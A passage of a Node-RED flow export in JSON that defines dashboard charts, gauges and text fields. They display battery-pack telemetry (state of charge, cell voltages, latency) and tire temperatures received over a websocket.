            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 780,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "45f832d9af22bd04",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "99a5eab2c01b6e31",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Cell Voltage (V)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 760,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "c20bc04e738cf069",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "2765c37e7aa9e5fa",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Resistances (Ohm)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 770,
        "y": 280,
        "wires": [
            []
        ]
    },
    {
        "id": "980a89194ee4a5f9",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "32f9514944cd045a",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Pack Amphours",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 760,
        "y": 120,
        "wires": [
            []
        ]
    },
    {
        "id": "64e2db8ac1cc6ff8",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "9aa6fcac7bcb047b",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Total Packet Cycles",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 770,
        "y": 40,
        "wires": [
            []
        ]
    },
    {
        "id": "8326a393562f231b",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "99a5eab2c01b6e31",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Input Supply Voltage (V)",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 790,
        "y": 320,
        "wires": [
            []
        ]
    },
    {
        "id": "5d79523904eb1a14",
        "type": "ui_text",
        "z": "54ee7ab52b252314",
        "group": "7b787f4fad695373",
        "order": 1,
        "width": 4,
        "height": 1,
        "name": "",
        "label": "Server Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 770,
        "y": 360,
        "wires": []
    },
    {
        "id": "3da3df35da0f6272",
        "type": "ui_text",
        "z": "54ee7ab52b252314",
        "group": "7b787f4fad695373",
        "order": 2,
        "width": 4,
        "height": 1,
        "name": "",
        "label": "Total Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 750,
        "y": 400,
        "wires": []
    },
    {
        "id": "0e3d0c0b7f2e0313",
        "type": "json",
        "z": "54ee7ab52b252314",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 390,
        "y": 180,
        "wires": [
            [
                "af45de85e4f392f6"
            ]
        ]
    },
    {
        "id": "c652aee64589c1d7",
        "type": "websocket in",
        "z": "54ee7ab52b252314",
        "name": "",
        "server": "31337e6096350fd4",
        "client": "",
        "x": 190,
        "y": 180,
        "wires": [
            [
                "0e3d0c0b7f2e0313"
            ]
        ]
    },
    {
        "id": "90d141c6c2a1cbe8",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "2765c37e7aa9e5fa",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Pack Voltage (V)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 760,
        "y": 160,
        "wires": [
            []
        ]
    },
    {
        "id": "fce4f2a6f3872466",
        "type": "function",
        "z": "594e9fd18f91cc50",
        "name": "potentially useful messages",
        "func": "var sigFigs = 2\nconst currentDate = new Date();\nvar timestamp = currentDate.getTime();\n\n//REPEATED?\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload.Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_state_of_health =\n{\n    topic: \"Pack State of Health\",\n    payload: msg.payload.pack_state_of_health\n}\ntry {\n    pack_state_of_health.payload = pack_state_of_health.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_summed_voltage =\n{\n    topic: \"Pack Summed Voltage\",\n    payload: msg.payload.pack_summed_voltage\n}\ntry {\n    pack_summed_voltage.payload = pack_summed_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_total_capacity =\n{\n    topic: \"Adaptive Total Capacity\",\n    payload: msg.payload.adaptive_total_capacity\n}\ntry {\n    adaptive_total_capacity.payload = adaptive_total_capacity.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_amp_hours =\n{\n    topic: \"Adaptive Amp Hours\",\n    payload: msg.payload.adaptive_amp_hours\n}\ntry {\n    adaptive_amp_hours.payload = adaptive_amp_hours.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_state_of_charge =\n{\n    topic: \"Adaptive State of Charge\",\n    payload: msg.payload.adaptive_state_of_charge\n}\ntry {\n    adaptive_state_of_charge.payload = adaptive_state_of_charge.payload.toFixed(sigFigs)\n} catch { }\n\nvar Failsafe_Statuses =\n{\n    topic: \"Failsafe Satuses\",\n    payload: msg.payload.Failsafe_Statuses\n}\n/* try {\n    failsafe_statuses.payload = failsafe_statuses.payload.toFixed(sigFigs)\n} catch { } */\n\nvar Rolling_Counter =\n{\n    topic: \"Rolling Counter\",\n    payload: msg.payload.Rolling_Counter\n}\ntry {\n    Rolling_Counter.payload = Rolling_Counter.payload.toFixed(sigFigs)\n} catch { }\n\nvar total_pack_adc =\n{\n    topic: \"Total Pack ADC\",\n    payload: msg.payload.total_pack_adc\n}\ntry {\n    total_pack_adc.payload = total_pack_adc.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Voltage =\n{\n    topic: \"Low Cell Voltage (V)\",\n    payload: msg.payload.Low_Cell_Voltage\n}\ntry {\n    Low_Cell_Voltage.payload = Low_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Voltage_ID =\n{\n    topic: \"Low Cell Voltage ID\",\n    payload: msg.payload.Low_Cell_Voltage_ID\n}\ntry {\n    Low_Cell_Voltage_ID.payload = Low_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (V)\",\n    payload: msg.payload.High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload.High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Voltage =\n{\n    topic: \"Average Cell Voltage\",\n    payload: msg.payload.Avg_Cell_Voltage\n}\ntry {\n    Avg_Cell_Voltage.payload = Avg_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar BMS_failsafeStatuses =\n{\n    topic: \"Average Cell Voltage\",\n    payload: msg.payload.BMS_failsafeStatuses\n}\ntry {\n    BMS_failsafeStatuses.payload = BMS_failsafeStatuses.payload.toFixed(sigFigs)\n} catch { }\n\nvar Latency =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Latency\n}\ntry {\n    Latency.payload = Latency.payload.toFixed(sigFigs)\n} catch { }\n\nvar Total_Latency =\n{\n    topic: \"Total Latency (s)\",\n    payload: (timestamp - msg.payload.Arduino_Time)\n}\ntry {\n    Total_Latency.payload = Total_Latency.payload / 1000\n    Total_Latency.payload = Total_Latency.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    Pack_SOC,\n    pack_state_of_health,\n    pack_summed_voltage,\n    adaptive_total_capacity,\n    adaptive_amp_hours,\n    adaptive_state_of_charge,\n    Failsafe_Statuses,\n    Rolling_Counter,\n    total_pack_adc,\n    Low_Cell_Voltage,\n    Low_Cell_Voltage_ID,\n    High_Cell_Voltage,\n    High_Cell_Voltage_ID,\n    Avg_Cell_Voltage, \n    BMS_failsafeStatuses,\n    Latency,\n    Total_Latency\n];\n",
        "outputs": 17,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 800,
        "y": 260,
        "wires": [
            [
                "6cae2349bbe224bf"
            ],
            [
                "d7a4e4283792083b"
            ],
            [
                "1355f066678b78da"
            ],
            [
                "461a17a2e944d6fe"
            ],
            [
                "a7e47b2385653e58"
            ],
            [
                "6c2745fe442397c9"
            ],
            [
                "19ebdd6de4e7ec22"
            ],
            [
                "faf4259f29f4989a"
            ],
            [
                "a063d9a10e3f65a6"
            ],
            [
                "30e16296e8c67c55"
            ],
            [
                "1042301885d9fe1d"
            ],
            [
                "78da8df175f75d03"
            ],
            [
                "159b9ce9eee465f6"
            ],
            [
                "4a0de4b619a5b63c"
            ],
            [
                "d52d09416ca80cc5"
            ],
            [
                "6e74b6eef84da91b"
            ],
            [
                "b27ee066c03b4613"
            ]
        ]
    },
    {
        "id": "6cae2349bbe224bf",
        "type": "ui_gauge",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 9,
        "width": "4",
        "height": "4",
        "gtype": "gage",
        "title": "Pack Depth of Discharge",
        "label": "Percentage",
        "format": "{{value | number:2}}%",
        "min": 0,
        "max": "100",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 1130,
        "y": 160,
        "wires": []
    },
    {
        "id": "d7a4e4283792083b",
        "type": "ui_gauge",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "d8a5fe66020a6697",
        "order": 2,
        "width": 4,
        "height": 4,
        "gtype": "gage",
        "title": "Pack State of Health",
        "label": "Percentage",
        "format": "{{value | number:2}}%",
        "min": 0,
        "max": "100",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 1120,
        "y": 200,
        "wires": []
    },
    {
        "id": "1355f066678b78da",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "d8a5fe66020a6697",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Pack Summed Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1120,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "461a17a2e944d6fe",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "e63418a16c0537d9",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Adaptive Total Capacity",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1130,
        "y": 280,
        "wires": []
    },
    {
        "id": "a7e47b2385653e58",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "e63418a16c0537d9",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Adaptive Amp Hours",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1120,
        "y": 320,
        "wires": [
            []
        ]
    },
    {
        "id": "6c2745fe442397c9",
        "type": "ui_gauge",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "d8a5fe66020a6697",
        "order": 3,
        "width": 4,
        "height": 4,
        "gtype": "gage",
        "title": "Adaptive State of Charge",
        "label": "Percentage",
        "format": "{{value | number:2}}%",
        "min": 0,
        "max": "100",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 1130,
        "y": 360,
        "wires": []
    },
    {
        "id": "19ebdd6de4e7ec22",
        "type": "function",
        "z": "594e9fd18f91cc50",
        "name": "failsafe status interpreter",
        "func": "return msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1130,
        "y": 400,
        "wires": [
            [
                "4ec3ba31add2e0e4"
            ]
        ]
    },
    {
        "id": "faf4259f29f4989a",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "39ac332c647b21aa",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Rolling Counter",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "0",
        "ymax": "255",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1100,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "a063d9a10e3f65a6",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "93bfab3c1f52bc9c",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Total Pack ADC",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1100,
        "y": 480,
        "wires": [
            []
        ]
    },
    {
        "id": "30e16296e8c67c55",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "e63418a16c0537d9",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Low Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1110,
        "y": 520,
        "wires": [
            []
        ]
    },
    {
        "id": "1042301885d9fe1d",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "e63418a16c0537d9",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Low Cell Voltage ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1110,
        "y": 560,
        "wires": []
    },
    {
        "id": "78da8df175f75d03",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "39ac332c647b21aa",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "High Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1110,
        "y": 600,
        "wires": [
            []
        ]
    },
    {
        "id": "159b9ce9eee465f6",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "e63418a16c0537d9",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "High Cell Voltage ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1120,
        "y": 640,
        "wires": []
    },
    {
        "id": "4a0de4b619a5b63c",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "93bfab3c1f52bc9c",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Average Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1120,
        "y": 680,
        "wires": [
            []
        ]
    },
    {
        "id": "4ec3ba31add2e0e4",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "e63418a16c0537d9",
        "order": 6,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Failsafe status",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1380,
        "y": 400,
        "wires": []
    },
    {
        "id": "d52d09416ca80cc5",
        "type": "function",
        "z": "594e9fd18f91cc50",
        "name": "failsafe status interpreter",
        "func": "return msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1130,
        "y": 720,
        "wires": [
            [
                "2e3a44a766a53690"
            ]
        ]
    },
    {
        "id": "2e3a44a766a53690",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "e63418a16c0537d9",
        "order": 7,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "BMS Failsafe status",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1400,
        "y": 720,
        "wires": []
    },
    {
        "id": "6e74b6eef84da91b",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "dbbdedbe852cd727",
        "order": 1,
        "width": 4,
        "height": 1,
        "name": "",
        "label": "Server Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 1110,
        "y": 760,
        "wires": []
    },
    {
        "id": "b27ee066c03b4613",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "dbbdedbe852cd727",
        "order": 2,
        "width": 4,
        "height": 1,
        "name": "",
        "label": "Total Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 1110,
        "y": 800,
        "wires": []
    },
    {
        "id": "97d168bd4f74ef5c",
        "type": "json",
        "z": "594e9fd18f91cc50",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 590,
        "y": 260,
        "wires": [
            [
                "fce4f2a6f3872466"
            ]
        ]
    },
    {
        "id": "104d4a8362b34064",
        "type": "websocket in",
        "z": "594e9fd18f91cc50",
        "name": "",
        "server": "31337e6096350fd4",
        "client": "",
        "x": 390,
        "y": 260,
        "wires": [
            [
                "97d168bd4f74ef5c"
            ]
        ]
    },
    {
        "id": "191bf4adfc13a413",
        "type": "function",
        "z": "145277527b95dd1c",
        "name": "Suspension",
        "func": "var sigFigs = 2\nconst currentDate = new Date();\nvar timestamp = currentDate.getTime();\n\nvar VCU_avgTireTempFL =\n{\n    topic: \"Average Front Left Tire Temp\",\n    payload: msg.payload.VCU_avgTireTempFL\n}\ntry {\n    VCU_avgTireTempFL.payload = VCU_avgTireTempFL.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_avgTireTempFR =\n{\n    topic: \"Average Front Right Tire Temp\",\n    payload: msg.payload.VCU_avgTireTempFR\n}\ntry {\n    VCU_avgTireTempFR.payload = VCU_avgTireTempFR.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_avgTireTempRL =\n{\n    topic: \"Average Rear Left Tire Temp\",\n    payload: msg.payload.VCU_avgTireTempRL\n}\ntry {\n    VCU_avgTireTempRL.payload = VCU_avgTireTempRL.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_avgTireTempRR =\n{\n    topic: \"Average Rear Right Tire Temp\",\n    payload: msg.payload.VCU_avgTireTempRR\n}\ntry {\n    VCU_avgTireTempRR.payload = VCU_avgTireTempRR.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_avgTireTempFL,\n    VCU_avgTireTempFR,\n    VCU_avgTireTempRL,\n    VCU_avgTireTempRR\n];\n",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 670,
        "y": 260,
        "wires": [
            [
                "5dd5a2cc416a7fa4",
                "8bd209de41bb0624"
            ],
            [
                "5dd5a2cc416a7fa4",
                "824b41b7d5046905"
            ],
            [
                "5dd5a2cc416a7fa4",
                "8505570f0f1daa1e"
            ],
            [
                "5dd5a2cc416a7fa4",
                "974f7d35d18139f9"
            ]
        ]
    },
    {
        "id": "5dd5a2cc416a7fa4",
        "type": "ui_chart",
        "z": "145277527b95dd1c",
        "name": "",
        "group": "ecfced67d8ed028f",
        "order": 2,
        "width": "8",
        "height": "6",
        "label": "All Tire Temps",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#f25022",
            "#7fba00",
            "#00a4ef",
            "#ffb900",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1020,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "8b2df2f9a7120116",
        "type": "json",
        "z": "145277527b95dd1c",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 510,
        "y": 260,
        "wires": [
            [
                "191bf4adfc13a413"
            ]
        ]
    },
    {
        "id": "34c891960ee24fea",
        "type": "websocket in",
        "z": "145277527b95dd1c",
        "name": "",
        "server": "31337e6096350fd4",
        "client": "",
        "x": 310,
        "y": 260,
        "wires": [
            [
                "8b2df2f9a7120116"
            ]
        ]
    },
    {
        "id": "8bd209de41bb0624",
        "type": "ui_chart",
        "z": "145277527b95dd1c",
        "name": "",
        "group": "d9b31008e688a650",
        "order": 2,
        "width": "8",
        "height": "6",
        "label": "Front Left Tire Temp",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "10",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#f25022",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1040,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "824b41b7d5046905",
        "type": "ui_chart",
        "z": "145277527b95dd1c",
        "name": "",
        "group": "0467436d0e8f2b5d",
        "order": 2,
        "width": "8",
        "height": "6",
        "label": "Front Right Tire Temp",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "10",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#7fba00",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1040,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "8505570f0f1daa1e",
        "type": "ui_chart",
        "z": "145277527b95dd1c",
        "name": "",
        "group": "6339467b612ef059",
        "order": 2,
        "width": "8",
        "height": "6",
        "label": "Rear Left Tire Temp",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "10",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#00a4ef",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1030,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "974f7d35d18139f9",
        "type": "ui_chart",
        "z": "145277527b95dd1c",
        "name": "",
        "group": "ecfced67d8ed028f",
        "order": 2,
        "width": "8",
        "height": "6",
        "label": "Rear Right Tire Temp",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "10",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb900",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1040,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
